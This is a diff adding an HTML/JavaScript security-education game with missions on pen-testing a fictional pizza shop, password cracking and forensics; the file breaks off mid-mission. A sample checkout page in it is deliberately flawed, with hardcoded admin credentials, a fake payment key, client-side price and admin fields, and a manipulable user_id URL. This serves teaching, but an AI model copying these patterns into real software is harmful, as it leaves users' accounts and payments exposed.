@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Catch the Intruder</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#090d18;--panel:#121929;--panel2:#18213a;--text:#e9eef8;--muted:#8d99b6;--line:#253050;--accent:#8b6bff;--good:#3ddc84;--bad:#ff5470;--warn:#ffc53d}
+*{box-sizing:border-box}
+html,body{margin:0}
+body{background:var(--bg);color:var(--text);font-family:'Space Grotesk',system-ui,sans-serif;min-height:100vh;-webkit-font-smoothing:antialiased}
+body::before{content:"";position:fixed;inset:0;z-index:-1;background:
+ radial-gradient(900px 500px at 15% -10%,color-mix(in srgb,var(--accent) 22%,transparent),transparent 70%),
+ radial-gradient(700px 500px at 110% 20%,rgba(60,90,255,.12),transparent 70%),
+ linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px) 0 0/32px 32px,
+ linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px) 0 0/32px 32px,var(--bg);transition:background .6s}
+.mono{font-family:'JetBrains Mono',monospace}
+#app{max-width:760px;margin:0 auto;padding:22px 16px 70px}
+.kicker{font-size:12px;letter-spacing:.14em;color:var(--accent);font-weight:700}
+h1,h2{margin:0;line-height:1.1}
+p{line-height:1.6}
+.card{background:linear-gradient(180deg,var(--panel),#0f1524);border:1px solid var(--line);border-radius:20px;padding:22px;box-shadow:0 20px 60px -30px rgba(0,0,0,.8)}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;background:var(--accent);color:#070a12;font:700 16px 'Space Grotesk',sans-serif;border:0;border-radius:14px;padding:15px 22px;cursor:pointer;margin-top:18px;width:100%;transition:transform .12s,filter .2s;box-shadow:0 10px 30px -10px var(--accent)}
+.btn:hover{filter:brightness(1.1)}.btn:active{transform:scale(.98)}
+.btn.ghost{background:transparent;color:var(--text);border:1px solid var(--line);box-shadow:none}
+.back{background:none;border:1px solid var(--line);color:var(--muted);border-radius:10px;padding:8px 12px;font:500 14px 'Space Grotesk';cursor:pointer;margin-bottom:16px}
+.back:hover{color:var(--text)}
+
+.hero{text-align:center;padding:26px 0 24px}
+.hero h1{font-size:clamp(42px,12vw,80px);font-weight:700;letter-spacing:-.03em}
+.hero h1 span{background:linear-gradient(90deg,#2de2c4,#8b6bff,#ff4fd8);-webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{color:var(--muted);font-size:18px;margin:10px auto 18px;max-width:460px}
+.rank{display:inline-flex;gap:10px;align-items:center;background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:8px 16px;font-size:14px}
+.rank .mono{font-size:11px;color:var(--muted);letter-spacing:.12em}
+.starsmall{color:var(--warn);letter-spacing:1px}
+.missions{display:grid;gap:14px;margin-top:8px}
+.mcard{display:flex;gap:16px;align-items:center;text-align:left;width:100%;background:linear-gradient(110deg,color-mix(in srgb,var(--accent) 14%,var(--panel)),var(--panel) 55%);border:1px solid var(--line);border-left:4px solid var(--accent);border-radius:18px;padding:18px;color:var(--text);cursor:pointer;font:inherit;transition:transform .15s,box-shadow .2s}
+.mcard:hover{transform:translateY(-2px);box-shadow:0 14px 40px -16px var(--accent)}
+.micon{flex:none;width:64px;height:64px;border-radius:16px;display:grid;place-items:center;font-size:34px;background:color-mix(in srgb,var(--accent) 22%,#0b1020);border:1px solid color-mix(in srgb,var(--accent) 45%,transparent)}
+.mtxt{flex:1;min-width:0}
+.mnum{font-size:11px;letter-spacing:.1em;color:var(--accent);font-weight:700;display:flex;gap:8px;flex-wrap:wrap}
+.mnum .diff{color:var(--warn)}
+.mcard h2{font-size:22px;margin:4px 0 2px}
+.mcard p{margin:0;color:var(--muted);font-size:15px}
+.mmeta{display:flex;justify-content:space-between;align-items:center;margin-top:8px;font-size:13px;color:var(--muted);gap:8px}
+.st{color:var(--warn);font-size:16px;letter-spacing:2px}.st i{font-style:normal;color:#3a4566}
+.teach{margin-top:22px;background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:14px 18px;color:var(--muted);font-size:15px}
+.teach summary{cursor:pointer;color:var(--text);font-weight:600}
+.teach ul{padding-left:18px;margin:10px 0 2px}.teach li{margin:6px 0;line-height:1.5}
+
+.bigicon{font-size:56px;margin:12px 0 6px}
+.mt{font-size:clamp(32px,8vw,44px)}
+.subt{color:var(--muted);margin:6px 0 16px;font-size:17px}
+.role{display:flex;flex-direction:column;gap:2px;background:color-mix(in srgb,var(--accent) 12%,var(--panel2));border:1px solid color-mix(in srgb,var(--accent) 40%,transparent);border-radius:12px;padding:12px 14px}
+.role .mono{font-size:11px;color:var(--accent);letter-spacing:.12em}
+.typed{font-size:17px;min-height:120px;margin:16px 0}
+.typed::after{content:"▌";color:var(--accent);animation:blink 1s steps(1) infinite}
+.typed.done::after{display:none}
+@keyframes blink{50%{opacity:0}}
+.objectives{background:var(--panel2);border-radius:12px;padding:12px 16px}
+.objectives .mono{font-size:11px;color:var(--muted);letter-spacing:.12em}
+.objectives ol{margin:8px 0 0;padding-left:20px}.objectives li{margin:4px 0}
+
+.hud{display:flex;align-items:center;gap:12px;margin-bottom:14px;position:sticky;top:0;z-index:5;padding:10px 0;background:linear-gradient(var(--bg) 70%,transparent)}
+.hud .back{margin:0;padding:6px 11px}
+.hudmid{flex:1;min-width:0}
+.hudname{font-size:12px;letter-spacing:.1em;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dots{display:flex;gap:6px;margin-top:6px}
+.dot{flex:1;height:6px;border-radius:9px;background:var(--line)}
+.dot.done{background:var(--accent)}
+.dot.cur{background:color-mix(in srgb,var(--accent) 45%,var(--line));box-shadow:0 0 12px var(--accent)}
+.xp{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:7px 11px;font-size:13px;font-weight:700;color:var(--accent);white-space:nowrap}
+.xp.pop{animation:pop .5s}
+@keyframes pop{40%{transform:scale(1.2)}}
+
+.stage h2{font-size:clamp(24px,6vw,30px);margin:8px 0 4px}
+.brieftxt{color:#c3cce0;margin:6px 0 16px;font-size:16.5px}
+
+.opt{display:flex;gap:12px;align-items:flex-start;width:100%;text-align:left;background:var(--panel2);border:1.5px solid var(--line);color:var(--text);padding:14px;border-radius:14px;margin:9px 0;font:500 15.5px/1.45 'Space Grotesk',sans-serif;cursor:pointer;transition:border-color .15s,background .15s,transform .1s}
+.opt:hover:not(:disabled){border-color:var(--accent);transform:translateX(2px)}
+.opt:disabled{cursor:default}
+.opt .ok{flex:none;width:28px;height:28px;border-radius:8px;display:grid;place-items:center;background:var(--line);font-size:13px;font-weight:700}
+.opt.right{border-color:var(--good);background:rgba(61,220,132,.12)}.opt.right .ok{background:var(--good);color:#06120b}
+.opt.wrong{border-color:var(--bad);background:rgba(255,84,112,.12)}.opt.wrong .ok{background:var(--bad);color:#1a0509}
+
+.note{border-left:3px solid var(--line);background:var(--panel2);border-radius:0 12px 12px 0;padding:11px 14px;margin:9px 0;font-size:15px;line-height:1.5;animation:slide .3s ease}
+.note.good{border-color:var(--good)}.note.good b{color:var(--good)}
+.note.bad{border-color:var(--bad)}.note.bad b{color:var(--bad)}
+.note.miss{border-color:var(--warn)}.note.miss b{color:var(--warn)}
+@keyframes slide{from{opacity:0;transform:translateY(-6px)}}
+
+.spotbar{display:flex;justify-content:space-between;font-size:12px;letter-spacing:.08em;color:var(--muted);margin-bottom:10px}
+.spotbar b{color:var(--text);font-size:14px}
+.doc{background:#0c1220;border:1px solid var(--line);border-radius:14px;padding:14px 16px;font-size:15.5px;line-height:1.75}
+.doc .ln{padding:3px 0}
+.doc .lbl{color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:12.5px;margin-right:6px}
+.doc-site{font-family:'JetBrains Mono',monospace;font-size:13.5px;line-height:1.7}
+.doc-site .ln{background:var(--panel2);border-radius:8px;padding:8px 10px;margin:6px 0}
+.doc-site .ln.head{background:none;font-family:'Space Grotesk';font-weight:700;padding:2px 0 8px;border-bottom:1px solid var(--line);margin-bottom:6px}
+.doc-log .ln{font-family:'JetBrains Mono',monospace;font-size:13px;border-bottom:1px solid rgba(255,255,255,.05);padding:6px 0}
+.doc-log .ln.head{font-family:'Space Grotesk';font-weight:700;border-bottom:1px solid var(--line)}
+/* CODE VIEWER */
+.codewrap{background:#0a0f1c;border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.codetop{display:flex;align-items:center;gap:8px;padding:9px 13px;background:#0e1424;border-bottom:1px solid var(--line)}
+.codetop .dotrgb{display:flex;gap:6px}.codetop .dotrgb i{width:11px;height:11px;border-radius:50%}
+.codetop .u{flex:1;text-align:center;font:600 12px 'JetBrains Mono';color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.code{font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.75;padding:8px 0;overflow-x:auto}
+.cl{display:flex;align-items:flex-start;gap:0;padding:1px 0;transition:background .15s;position:relative}
+.cl.tap{cursor:pointer}
+.cl.tap:hover{background:rgba(255,255,255,.045)}
+.cl .lno{flex:none;width:38px;text-align:right;padding-right:12px;color:#3f4c6b;user-select:none;border-right:1px solid rgba(255,255,255,.05)}
+.cl .cc{padding-left:12px;white-space:pre-wrap;word-break:break-word;flex:1}
+.cl.hit{background:rgba(61,220,132,.13)}
+.cl.hit .lno{color:var(--good);font-weight:700}
+.cl.hit .cc::after{content:" 🚩"}
+.cl.miss{background:rgba(255,84,112,.1)}.cl.miss .lno{color:var(--bad)}
+.cl.missed{background:rgba(255,197,61,.13)}.cl.missed .lno{color:var(--warn)}
+.c-tag{color:#7cc2ff}.c-atr{color:#2de2c4}.c-str{color:#ffb86b}.c-com{color:#5a6b52;font-style:italic}.c-pun{color:#8d99b6}
+.seg{cursor:pointer;border-bottom:1.5px dotted #56638a;border-radius:4px;padding:1px 2px;transition:background .2s}
+.seg:hover{background:rgba(255,255,255,.07)}
+.seg.hit{background:rgba(61,220,132,.2);border-bottom:2px solid var(--good);color:#dcffe9}
+.seg.hit::after{content:" 🚩"}
+.seg.miss{background:rgba(255,84,112,.12);border-bottom:2px solid var(--bad);cursor:default}
+.seg.missed{background:rgba(255,197,61,.16);border-bottom:2px solid var(--warn)}
+.shake{animation:shake .35s}
+@keyframes shake{25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
+.log{margin-top:10px}
+
+.hint{font-size:12px;color:var(--muted);letter-spacing:.06em;margin-bottom:10px}
+.slots{display:grid;gap:8px;margin-bottom:14px}
+.slot{display:flex;gap:12px;align-items:center;min-height:50px;border-radius:12px;padding:10px 12px;font:500 15px/1.4 'Space Grotesk';text-align:left;color:var(--text);width:100%}
+.slot.empty{border:1.5px dashed var(--line);color:var(--muted)}
+.slot.filled{background:color-mix(in srgb,var(--accent) 14%,var(--panel2));border:1.5px solid color-mix(in srgb,var(--accent) 50%,transparent);cursor:pointer}
+.slot.ok{border-color:var(--good);background:rgba(61,220,132,.12)}
+.slot.no{border-color:var(--bad);background:rgba(255,84,112,.1)}
+.num{flex:none;width:28px;height:28px;border-radius:50%;display:grid;place-items:center;background:var(--line);font:700 13px 'JetBrains Mono'}
+.slot.filled .num{background:var(--accent);color:#070a12}
+.slot.ok .num{background:var(--good)}.slot.no .num{background:var(--bad)}
+.pool{display:flex;flex-wrap:wrap;gap:8px}
+.chip{background:var(--panel2);border:1.5px solid var(--line);color:var(--text);border-radius:12px;padding:11px 14px;font:500 15px 'Space Grotesk';cursor:pointer;text-align:left}
+.chip:hover{border-color:var(--accent)}
+.answer{margin-top:14px}
+.answer .mono{font-size:11px;letter-spacing:.12em;color:var(--muted)}
+.answer ol{padding-left:20px;margin:8px 0}.answer li{margin:8px 0;line-height:1.5}
+.answer li span{color:var(--muted);display:block;font-size:14.5px}
+
+/* PASSWORD LAB */
+.plab{background:#0c1220;border:1px solid var(--line);border-radius:14px;padding:16px}
+.plab label{font-size:12px;letter-spacing:.1em;color:var(--muted);font-family:'JetBrains Mono'}
+.pin{width:100%;margin:8px 0 4px;background:var(--panel2);border:1.5px solid var(--line);border-radius:12px;color:var(--text);font:600 18px 'JetBrains Mono';padding:13px 14px;letter-spacing:1px}
+.pin:focus{outline:none;border-color:var(--accent)}
+.pstat{display:flex;justify-content:space-between;align-items:baseline;margin-top:12px}
+.pstat .t{font-size:12px;color:var(--muted);letter-spacing:.08em}
+.pstat .big{font:700 26px 'JetBrains Mono'}
+.pbar{height:10px;border-radius:9px;background:var(--line);overflow:hidden;margin:8px 0}
+.pbar i{display:block;height:100%;transition:width .3s,background .3s}
+.pwhy{font-size:13.5px;color:var(--muted);margin-top:6px;min-height:20px;line-height:1.5}
+.ptry{display:flex;flex-wrap:wrap;gap:7px;margin:12px 0 0}
+.ptry button{background:var(--panel2);border:1px solid var(--line);color:var(--muted);font:600 12px 'JetBrains Mono';border-radius:8px;padding:6px 9px;cursor:pointer}
+.ptry button:hover{border-color:var(--accent);color:var(--text)}
+.goalbox{background:color-mix(in srgb,var(--good) 12%,var(--panel2));border:1px solid color-mix(in srgb,var(--good) 40%,transparent);border-radius:12px;padding:11px 14px;margin-top:14px;font-size:14.5px}
+.goalbox.hit b{color:var(--good)}
+
+/* TERMINAL */
+.objs{background:var(--panel2);border:1px solid var(--line);border-radius:14px;padding:12px 14px;margin-bottom:12px}
+.objs .mono{font-size:11px;letter-spacing:.12em;color:var(--muted);display:flex;justify-content:space-between}
+.objs .mono b{color:var(--good)}
+.obj{display:flex;gap:10px;align-items:flex-start;padding:6px 0;font-size:14.5px;line-height:1.4;color:var(--muted);transition:color .2s}
+.obj .obx{flex:none;width:20px;height:20px;border-radius:6px;border:1.5px solid var(--line);display:grid;place-items:center;font-size:12px;margin-top:1px}
+.obj.done{color:var(--text)}
+.obj.done .obx{background:var(--good);border-color:var(--good);color:#06120b}
+.obj.done .lbl{text-decoration:line-through;text-decoration-color:var(--good)}
+.term{background:#05080f;border:1px solid var(--line);border-radius:14px;overflow:hidden;box-shadow:inset 0 0 40px rgba(0,0,0,.5)}
+.termtop{display:flex;align-items:center;gap:8px;padding:8px 12px;background:#0a0f1c;border-bottom:1px solid var(--line)}
+.termtop .dotrgb{display:flex;gap:6px}.termtop .dotrgb i{width:11px;height:11px;border-radius:50%}
+.termtop .u{flex:1;text-align:center;font:600 12px 'JetBrains Mono';color:var(--muted)}
+.termout{font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.65;padding:12px 13px;height:46vh;min-height:280px;max-height:460px;overflow-y:auto;white-space:pre-wrap;word-break:break-word}
+.termout .ol{margin:1px 0}
+.termout .cmdline{color:#aeb9d6}.termout .cmdline .pr{color:var(--good)}
+.termout .err{color:var(--bad)}
+.termout .okmsg{color:var(--good)}
+.termout .sys{color:var(--muted)}
+.ls-d{color:#7cc2ff;font-weight:700}.ls-x{color:#3ddc84}.ls-f{color:var(--text)}
+.hlmatch{background:rgba(255,197,61,.35);color:#ffe9a8;border-radius:3px;padding:0 1px}
+.termline{display:flex;align-items:center;gap:7px;border-top:1px solid var(--line);padding:9px 12px;background:#060a12}
+.termline .pr{color:var(--good);font:600 13px 'JetBrains Mono';white-space:nowrap}
+.cin{flex:1;background:none;border:0;color:var(--text);font:600 14px 'JetBrains Mono';outline:none;caret-color:var(--good)}
+.chips{display:flex;gap:7px;overflow-x:auto;padding:10px 2px 2px;-webkit-overflow-scrolling:touch}
+.chips button{flex:none;background:var(--panel2);border:1px solid var(--line);color:var(--muted);font:600 12px 'JetBrains Mono';border-radius:8px;padding:7px 10px;cursor:pointer;white-space:nowrap}
+.chips button:hover{border-color:var(--accent);color:var(--text)}
+.chips .hintbtn{color:var(--warn);border-color:color-mix(in srgb,var(--warn) 40%,transparent)}
+.result{display:flex;align-items:center;gap:16px;margin-top:20px;padding:16px;border-radius:16px;background:var(--panel2);border:1px solid var(--line);animation:slide .4s}
+.result .pts{font-size:34px;font-weight:700;color:var(--accent)}
+.result .pts small{font-size:14px;color:var(--muted)}
+.result.good{border-color:var(--good)}.result.bad{border-color:var(--warn)}
+.fact{margin-top:12px;border-radius:16px;padding:14px 16px;background:linear-gradient(120deg,color-mix(in srgb,var(--accent) 18%,var(--panel2)),var(--panel2));border:1px solid color-mix(in srgb,var(--accent) 35%,transparent)}
+.fact .mono{font-size:11px;letter-spacing:.12em;color:var(--accent);font-weight:700}
+.fact p{margin:6px 0 0}
+
+.debrief{text-align:center}
+.bigstars{font-size:46px;color:var(--warn);letter-spacing:6px;margin:6px 0}
+.bigstars i{font-style:normal;color:#2f3956}
+.bigstars span{display:inline-block;animation:starIn .5s backwards}
+@keyframes starIn{from{transform:scale(0) rotate(-90deg)}}
+.pct{color:var(--muted);font-size:14px}
+.badge{display:flex;gap:14px;align-items:center;justify-content:center;margin:18px auto;padding:14px 18px;border-radius:16px;background:color-mix(in srgb,var(--accent) 14%,var(--panel2));border:1px solid var(--accent);width:fit-content;text-align:left}
+.badge span{font-size:36px}.badge .mono{font-size:11px;letter-spacing:.12em;color:var(--accent)}
+.badge.locked{border-style:dashed;border-color:var(--line);background:var(--panel2);filter:grayscale(1);opacity:.75}
+.lessons,.talk{text-align:left;background:var(--panel2);border-radius:14px;padding:14px 18px;margin-top:12px}
+.lessons .mono,.talk .mono{font-size:11px;letter-spacing:.12em;color:var(--muted)}
+.lessons ul{margin:8px 0 0;padding-left:0;list-style:none}
+.lessons li{margin:8px 0;padding-left:26px;position:relative;line-height:1.5}
+.lessons li::before{content:"✓";position:absolute;left:0;color:var(--good);font-weight:700}
+.talk p{margin:6px 0 0}
+.row{display:flex;gap:10px}.row .btn{flex:1}
+@media (max-width:480px){.card{padding:18px;border-radius:18px}.mcard{padding:15px;gap:13px}.micon{width:54px;height:54px;font-size:28px}.row{flex-direction:column}.row .btn+.btn{margin-top:0}}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+const MISSIONS=[
+{
+ id:"pizza", icon:"🍕", accent:"#ff9f1c", tag:"PEN TESTING", diff:"✦", time:"~30 min",
+ name:"How to Steal a Pizza", sub:"Hunt for security holes in a pizza shop’s website",
+ role:"Junior Penetration Tester", badge:"Bug Hunter",
+ intro:"Welcome to Pronto Pizza. Their new website takes orders, logins and payments, and the owner is sure it’s “totally secure.” You’ve been hired to prove otherwise, on purpose and with permission. This is penetration testing: a professional breaks in so the real criminals can’t. Find the weaknesses, don’t exploit anyone for real, and hand the owner a list of fixes.",
+ lessons:["A pen tester works with written permission; that’s what keeps it legal.","Never trust what the browser sends you: prices and roles must be checked on the server.","Low prices in the page, ID numbers in the web address and visible admin links are classic flaws.","Report every bug responsibly so it gets fixed, not abused."],
+ discuss:"A pen tester and a thief can find the exact same bug. What makes one a hero and the other a criminal? Would you trust a shop more or less if it hired hackers to attack itself?",
+ stages:[
+  {type:"choice", title:"Rules of Engagement",
+   brief:"The owner says “go for it, hack away!” over the phone. Before you touch anything, what do you make sure you have?",
+   options:[
+    {t:"Nothing, they said it’s fine. Start poking around.",fb:"A verbal “go on then” isn’t enough. Without clear written permission, testing a site is illegal, even with good intentions."},
+    {t:"A signed agreement listing exactly which site and features you may test.",correct:true,fb:"This is the “scope”: it protects you and the owner, and it’s the line between a professional and a criminal."},
+    {t:"A fast internet connection and a lucky hoodie.",fb:"Won’t hurt, but it’s not what makes testing legal or useful!"},
+    {t:"The owner’s admin password, handed over in a text.",fb:"A good tester tries to get in like a real attacker would. And passwords should never be sent by text anyway."}
+   ],
+   fact:"Professional testers agree “rules of engagement” first: what’s in scope, what’s off-limits, and who to call if something breaks. No cowboys."},
+  {type:"code", title:"View Source", url:"view-source:prontopizza.example/checkout",
+   brief:"You right-click the order page and choose “View Source” to read the exact code the website sent your browser. Developers leave surprising things in here. Tap any LINE that a tester should flag — careful, some lines are perfectly fine.",
+   lines:[
+    {code:"<!DOCTYPE html>",flag:false,why:"Standard. Every page starts this way. Nothing to see."},
+    {code:"<head>"},
+    {code:"  <title>Pronto Pizza — Checkout</title>",flag:false,why:"Just the page title shown in the browser tab. Harmless."},
+    {code:"  <!-- TODO before launch: delete test login  admin / admin123 -->",flag:true,why:"A developer left a REAL working username and password in a comment. “View Source” shows it to the whole world. Attackers hunt for exactly this."},
+    {code:"</head>"},
+    {code:"<body>"},
+    {code:"  <img src=\"/img/margherita.png\" alt=\"Margherita\">",flag:false,why:"Just a picture of a pizza. Not sensitive."},
+    {code:"  <h1>Review your order</h1>",flag:false,why:"Ordinary heading text. No problem here."},
+    {code:"  <input type=\"hidden\" name=\"price\" value=\"12.99\">",flag:true,why:"The PRICE is stored inside the page, where anyone can edit it before paying. The real price must be worked out on the server, never trusted from the browser."},
+    {code:"  <input type=\"hidden\" name=\"is_admin\" value=\"false\">",flag:true,why:"Whether you’re an admin is being decided in the browser. Flip it to “true” and you might unlock staff powers. Permissions must be checked on the server."},
+    {code:"  <a href=\"/admin\">Staff admin panel</a>",flag:true,why:"A visible link pointing straight at the admin area. The control-room door shouldn’t be signposted to customers."},
+    {code:"  <!-- payment key: pk_live_8842xk9920ffz -->",flag:true,why:"A secret payment key left in a comment. Keys like this can move real money and must never appear in a page visitors can read."},
+    {code:"  <script src=\"/js/checkout.js\"><\/script>",flag:false,why:"Loading the page’s own script is completely normal. Not a flaw by itself."},
+    {code:"  <p>Open until 11pm — order now!</p>",flag:false,why:"Just a friendly note. Nothing sensitive."},
+    {code:"</body>"}
+   ],
+   fact:"“View Source” shows the code a website sends your browser, and anyone can read it. Secrets, test logins, keys and “admin = false” flags should live on the server, never in the page."},
+  {type:"choice", title:"The £0.01 Pizza",
+   brief:"You spotted that the price sits in the page as a hidden field. You change your copy to £0.01 and the order goes through. In your report, what’s the real problem, and the fix?",
+   options:[
+    {t:"The customer is dishonest. Add a “please don’t cheat” notice.",fb:"You can’t fix a security hole with a polite sign. Attackers ignore notices."},
+    {t:"The website trusts data from the browser. The server must look up the real price itself.",correct:true,fb:"Exactly. Never trust what the browser sends. The server should always check the true price, quantity and total."},
+    {t:"Make the hidden field a different colour.",fb:"Colour changes nothing; the data is still editable."},
+    {t:"Ban that one customer’s account.",fb:"The hole is still there for the next person. Fix the cause, not one symptom."}
+   ],
+   fact:"“Never trust the client” is a golden rule of web security. Anything sent from a browser, prices, user IDs, discounts, can be tampered with."},
+  {type:"spot", style:"site", title:"Peeking at the URL",
+   brief:"After logging in to your own account, you look at the web address bar. Tap the parts that reveal a security problem worth reporting.",
+   lines:[
+    [{t:"https://prontopizza.example/account?user_id=1024",flag:true,why:"Your account is “1024”. What happens if you change it to 1025? If you can see someone else’s account, that’s a serious flaw (called IDOR)."}],
+    [{t:"&theme=dark",flag:false,why:"Just a display setting. Changing it only affects how the page looks to you."}],
+    [{t:"&role=customer",flag:true,why:"Your role is set in the web address. If changing it to “admin” works, the site is trusting the browser to say who’s in charge."}],
+    [{t:"&lang=en",flag:false,why:"Language setting. Harmless to change."}]
+   ],
+   fact:"When a site decides what you can see based only on a number or word in the address, attackers just edit the address. Permissions must be checked on the server, every time."},
+  {type:"sort", title:"The Responsible Report",
+   brief:"You’ve found four bugs. Now do the most important part of the job: report them properly. Tap the steps in the right order.",
+   items:[
+    {t:"🛑 Stop testing once you’ve proven each bug exists",d:"You don’t need to steal real data to prove a hole is real. Take just enough evidence."},
+    {t:"📝 Write a clear report: what, where, how risky, how to fix",d:"The owner can only fix what they understand."},
+    {t:"🔒 Send it privately to the owner, not public social media",d:"Shouting a live bug to the world helps criminals, not the shop."},
+    {t:"🤝 Give them time to fix it before anyone else is told",d:"Responsible disclosure: the whole point is to protect people."},
+    {t:"✅ Re-test after the fix to check it really worked",d:"A fix that doesn’t work is worse than none, because now everyone feels safe."}
+   ],
+   fact:"This is “responsible disclosure”, and companies pay “bug bounties” for exactly this. Finding a bug is half the job; getting it safely fixed is the other half."}
+ ]
+},
+{
+ id:"passwords", icon:"🔑", accent:"#2de2c4", tag:"PASSWORD SCIENCE", diff:"✦ ✦", time:"~45 min",
+ name:"Cracking a Million Passwords", sub:"See why weak passwords fall in seconds",
+ role:"Password Researcher", badge:"Key Master",
+ intro:"Criminals rarely “guess” passwords one by one. They use programs that try millions of common ones every second, and compare against huge leaked lists. Today you’ll see how that works, from the safe side, and learn to build a password that would take a computer longer than the age of the universe to crack. No real accounts, just the science.",
+ lessons:["Attackers use huge lists of common and leaked passwords, not random guessing.","Length matters more than fancy symbols: every extra character multiplies the work.","“Clever” swaps like 4 for a and 0 for o are already in the cracking tools.","A long passphrase of random words is strong AND memorable. Add 2FA for a safety net."],
+ discuss:"Why do you think “123456” is still one of the most common passwords in the world every year? What stops people choosing strong ones, and how could we make it easier?",
+ stages:[
+  {type:"choice", title:"How Cracking Really Works",
+   brief:"In films, hackers type guesses until one works. In real life, how does a password-cracking program usually find a password?",
+   options:[
+    {t:"It carefully types guesses by hand, one every few seconds.",fb:"Far too slow. Real tools are automatic and incredibly fast."},
+    {t:"It tries millions of common and leaked passwords per second against a stolen list.",correct:true,fb:"Right. It starts with “rockyou”-style lists of real leaked passwords and common patterns, testing millions a second."},
+    {t:"It phones the person and asks nicely.",fb:"That’s social engineering, a different attack. Cracking is about speed and lists."},
+    {t:"It reads your mind through the webcam.",fb:"Happily, no! But a sticky note on your monitor is a real risk."}
+   ],
+   fact:"A famous leak called “RockYou” exposed 32 million real passwords. Crackers still use that list today; if your password is on it, it falls instantly."},
+  {type:"sort", title:"The Cracking Queue",
+   brief:"A cracking tool works through easy guesses first. Tap these passwords in the order it would break them: FASTEST to crack first.",
+   hint:"TAP THE EASIEST-TO-CRACK FIRST. TAP A PLACED ONE TO UNDO.",
+   items:[
+    {t:"123456",d:"Instant. It’s at the very top of every attacker’s list, every year."},
+    {t:"liverpool",d:"Instant-ish. A single dictionary word, team names included, is tried almost immediately."},
+    {t:"Pa$$w0rd",d:"Seconds. The symbol swaps look clever but tools try them automatically."},
+    {t:"Tiger2014!",d:"Minutes to hours. Word + year + symbol is a pattern tools know well."},
+    {t:"brave-kettle-orbit-lemon",d:"Centuries. Four random words are long and unpredictable; no list contains them."}
+   ],
+   fact:"Adding one character doesn’t just make it “a bit” harder; it multiplies the possibilities. That’s why length beats everything."},
+  {type:"plab", title:"Build an Uncrackable Password",
+   brief:"Here’s a safe, offline strength estimator (it checks nobody and sends nothing). Type a password and watch the estimated crack time. Your goal: reach CENTURIES or more.",
+   goal:"Get the estimated crack time to CENTURIES or above",
+   fact:"Real password checkers like this run entirely on your own device. The strongest trick is simply more length: a passphrase of a few random words wins every time."},
+  {type:"choice", title:"One Password to Rule Them All?",
+   brief:"You’ve built one brilliant password. Should you use it everywhere, so you never forget it?",
+   options:[
+    {t:"Yes! One perfect password for every account.",fb:"Risky. If any one site is breached, attackers try that password everywhere else. It’s called “credential stuffing”."},
+    {t:"No. Use a password manager to make a different strong one per site, and turn on 2FA.",correct:true,fb:"Exactly. A password manager remembers them for you, and 2FA means a stolen password alone still isn’t enough."},
+    {t:"Yes, but add the website’s name on the end so it’s ‘different’.",fb:"Attackers guess this pattern instantly once they see one of your passwords."},
+    {t:"Write them all in a notes file called ‘passwords’.",fb:"If your device is breached, that file is the first thing an attacker opens."}
+   ],
+   fact:"2FA (two-factor authentication) is the single best upgrade to your security. Even a perfect password can leak; 2FA gives you a second lock."}
+ ]
+},
+{
+ id:"forensics", icon:"🔎", accent:"#8b6bff", tag:"DIGITAL FORENSICS", diff:"✦", time:"~30 min",
+ name:"How to Solve a Crime", sub:"Follow the digital evidence to catch the culprit",
+ role:"Digital Forensics Investigator", badge:"Truth Finder",
+ intro:"The Harbourview Museum’s priceless Golden Byte has vanished overnight. No broken windows, no fingerprints, but every modern crime leaves a digital trail. You’re the forensics investigator. Examine the evidence carefully, follow where it actually leads (not where it’s convenient), and name the culprit beyond reasonable doubt.",
+ lessons:["Digital forensics means collecting evidence carefully without changing it.","Timestamps, logs and metadata quietly record who did what, and when.","Follow evidence to the truth, even when it clears your first suspect.","A good investigator separates proof from assumptions."],
+ discuss:"Devices track far more than people realise: location, times, photos, messages. Is that good (it solves crimes) or worrying (it tracks everyone)? Where’s the line?",
+ stages:[
+  {type:"choice", title:"First on the Scene",
+   brief:"You arrive to find the museum’s unlocked laptop still switched on. What’s the first rule of digital forensics?",
+   options:[
+    {t:"Start clicking through files fast before anyone stops you.",fb:"Clicking around changes timestamps and can destroy the very evidence you need. Slow is smart."},
+    {t:"Preserve it carefully: don’t alter anything, and record exactly what you do.",correct:true,fb:"Right. Investigators make an exact copy and work on that, so the original stays untouched and the evidence holds up."},
+    {t:"Turn it off to keep it safe.",fb:"Powering down can wipe clues held in memory. There are careful procedures for this."},
+    {t:"Log into the owner’s email to look around.",fb:"That’s tampering, and often illegal. Evidence must be gathered properly to count."}
+   ],
+   fact:"Real investigators keep a “chain of custody”: a record of who handled evidence and when. Break it, and even solid proof can be thrown out of court."},
+  {type:"spot", style:"log", title:"The Door Logs",
+   brief:"The museum’s smart-lock records every badge swipe. Three staff had access. Tap the log entries that look suspicious and worth investigating.",
+   lines:[
+    [{t:"17:55  Badge: A. Chef   Door: Kitchen   ✓",flag:false,why:"The chef badging into the kitchen before closing. Completely normal."}],
+    [{t:"18:30  Museum closes · alarm set",flag:false,why:"Routine. Just marks closing time for your timeline."}],
+    [{t:"02:14  Badge: R. Night (guard)   Door: Vault   ✓",flag:true,why:"The vault opened at 2am. Worth a very close look, though a guard on patrol might have a reason."}],
+    [{t:"02:15  Badge: R. Night   Door: Vault   ✓ (2nd swipe)",flag:true,why:"Two swipes a minute apart. Propping a door, or someone else going in with the guard?"}],
